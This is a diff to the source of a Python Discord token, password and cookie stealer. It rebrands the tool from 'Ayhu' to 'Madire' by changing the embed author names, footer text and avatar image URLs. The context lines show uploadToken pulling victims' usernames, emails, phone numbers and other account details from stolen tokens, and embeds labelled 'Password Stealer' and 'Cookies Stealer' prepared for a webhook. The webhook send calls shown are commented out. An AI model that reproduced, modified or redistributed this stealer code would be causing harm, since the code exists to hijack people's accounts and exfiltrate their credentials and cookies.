@@ -221,7 +221,7 @@ def uploadToken(token, path):
     username, hashtag, email, idd, pfp, flags, nitro, phone = GetTokenInfo(token)
 
     if pfp == None:
-        pfp = "https://cdn.discordapp.com/attachments/970003785558683698/1031147917685309490/sa.jpg"
+        pfp = "https://cdn.discordapp.com/attachments/1502805154087440486/1503473556636569770/okaymadira.png?ex=6a037a5d&is=6a0228dd&hm=98916a893dce76c676b8def9572632f4d9b24b855974cedbc7f83b4dc205ddc1&"
     else:
         pfp = f"https://cdn.discordapp.com/avatars/{idd}/{pfp}"
 
@@ -352,15 +352,15 @@ def upload(name, tk=''):
                 }
             ],
             "author": {
-                "name": "Ayhu | Password Stealer"
+                "name": "Madire | Password Stealer"
             },
             "footer": {
-                "text": "@Ayhu Stealer",
-                "icon_url": "https://cdn.discordapp.com/attachments/970003785558683698/1031147917685309490/sa.jpg"
+                "text": "Madira",
+                "icon_url": "https://cdn.discordapp.com/attachments/1502805154087440486/1503473556636569770/okaymadira.png?ex=6a037a5d&is=6a0228dd&hm=98916a893dce76c676b8def9572632f4d9b24b855974cedbc7f83b4dc205ddc1&"
             }
             }
         ],
-        "avatar_url": "https://cdn.discordapp.com/attachments/970003785558683698/1031147917685309490/sa.jpg",
+        "avatar_url": "https://cdn.discordapp.com/attachments/1502805154087440486/1503473556636569770/okaymadira.png?ex=6a037a5d&is=6a0228dd&hm=98916a893dce76c676b8def9572632f4d9b24b855974cedbc7f83b4dc205ddc1&",
         "attachments": []
         }
         # urlopen(Request(hook, data=dumps(data).encode(), headers=headers))
@@ -384,15 +384,15 @@ def upload(name, tk=''):
                 }
             ],
             "author": {
-                "name": "Ayhu | Cookies Stealer"
+                "name": "Madire | Cookies Stealer"
             },
             "footer": {
-                "text": "@Ayhu Stealer",
-                "icon_url": "https://cdn.discordapp.com/attachments/970003785558683698/1031147917685309490/sa.jpg"
+                "text": "Madire Stealer",
+                "icon_url": "https://cdn.discordapp.com/attachments/1502805154087440486/1503473556636569770/okaymadira.png?ex=6a037a5d&is=6a0228dd&hm=98916a893dce76c676b8def9572632f4d9b24b855974cedbc7f83b4dc205ddc1&"
             }
             }
         ],
-        "avatar_url": "https://cdn.discordapp.com/attachments/970003785558683698/1031147917685309490/sa.jpg",
+        "avatar_url": "https://cdn.discordapp.com/attachments/1502805154087440486/1503473556636569770/okaymadira.png?ex=6a037a5d&is=6a0228dd&hm=98916a893dce76c676b8def9572632f4d9b24b855974cedbc7f83b4dc205ddc1&",
         "attachments": []
         }
         # urlopen(Request(hook, data=dumps(data).encode(), headers=headers))
